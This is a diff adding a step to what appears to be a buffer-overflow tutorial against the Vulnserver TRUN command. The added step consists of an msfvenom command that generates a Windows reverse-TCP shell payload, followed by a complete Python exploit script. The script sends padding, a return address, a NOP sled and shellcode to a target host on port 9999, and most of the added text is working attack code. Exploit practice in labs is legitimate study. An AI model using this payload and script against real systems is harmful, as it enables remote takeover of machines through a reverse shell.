@@ -280,6 +280,68 @@ Then press F2 on the keyboard, to set a breakpoint.
 -- Run the immunity debugger and run the .py file you have
 ************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
 ## Step 7: Generating shellcode
+
+To generate the shellcode, use the following command
+The LHOST is the ipaddress of kali machine: 10.0.2.255
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
+This will generate the shellcode and now copy it for the python script
+
+```bash
+#!/usr/bin/python
+import sys, socket
+
+# Define target IP and port
+target_ip = '10.0.0.52'
+target_port = 9999
+
+overflow = (
+"\xdd\xc1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x52\xb8\x51\xfa"
+"\x75\xb7\x31\x46\x17\x03\x46\x17\x83\x97\xfe\x97\x42\xeb"
+"\x17\xd5\xad\x13\xe8\xba\x24\xf6\xd9\xfa\x53\x73\x49\xcb"
+"\x10\xd1\x66\xa0\x75\xc1\xfd\xc4\x51\xe6\xb6\x63\x84\xc9"
+"\x47\xdf\xf4\x48\xc4\x22\x29\xaa\xf5\xec\x3c\xab\x32\x10"
+"\xcc\xf9\xeb\x5e\x63\xed\x98\x2b\xb8\x86\xd3\xba\xb8\x7b"
+"\xa3\xbd\xe9\x2a\xbf\xe7\x29\xcd\x6c\x9c\x63\xd5\x71\x99"
+"\x3a\x6e\x41\x55\xbd\xa6\x9b\x96\x12\x87\x13\x65\x6a\xc0"
+"\x94\x96\x19\x38\xe7\x2b\x1a\xff\x95\xf7\xaf\x1b\x3d\x73"
+"\x17\xc7\xbf\x50\xce\x8c\xcc\x1d\x84\xca\xd0\xa0\x49\x61"
+"\xec\x29\x6c\xa5\x64\x69\x4b\x61\x2c\x29\xf2\x30\x88\x9c"
+"\x0b\x22\x73\x40\xae\x29\x9e\x95\xc3\x70\xf7\x5a\xee\x8a"
+"\x07\xf5\x79\xf9\x35\x5a\xd2\x95\x75\x13\xfc\x62\x79\x0e"
+"\xb8\xfc\x84\xb1\xb9\xd5\x42\xe5\xe9\x4d\x62\x86\x61\x8d"
+"\x8b\x53\x25\xdd\x23\x0c\x86\x8d\x83\xfc\x6e\xc7\x0b\x22"
+"\x8e\xe8\xc1\x4b\x25\x13\x82\x79\xba\x19\xad\x16\xb8\x1d"
+"\x40\xbb\x35\xfb\x08\x53\x10\x54\xa5\xca\x39\x2e\x54\x12"
+"\x94\x4b\x56\x98\x1b\xac\x19\x69\x51\xbe\xce\x99\x2c\x9c"
+"\x59\xa5\x9a\x88\x06\x34\x41\x48\x40\x25\xde\x1f\x05\x9b"
+"\x17\xf5\xbb\x82\x81\xeb\x41\x52\xe9\xaf\x9d\xa7\xf4\x2e"
+"\x53\x93\xd2\x20\xad\x1c\x5f\x14\x61\x4b\x09\xc2\xc7\x25"
+"\xfb\xbc\x91\x9a\x55\x28\x67\xd1\x65\x2e\x68\x3c\x10\xce"
+"\xd9\xe9\x65\xf1\xd6\x7d\x62\x8a\x0a\x1e\x8d\x41\x8f\x3e"
+"\x6c\x43\xfa\xd6\x29\x06\x47\xbb\xc9\xfd\x84\xc2\x49\xf7"
+"\x74\x31\x51\x72\x70\x7d\xd5\x6f\x08\xee\xb0\x8f\xbf\x0f"
+"\x91")
+
+
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+	
+	s.send(('TRUN /.:/' + shellcode).encode())
+	s.close()
+	
+except:
+	print("Error Connecting to server")
+	sys.exit()
+```
+
+x90 is just like padding to avoid overwriting
+
+
 ************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
 ## Step 8: Gain Root
 ************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
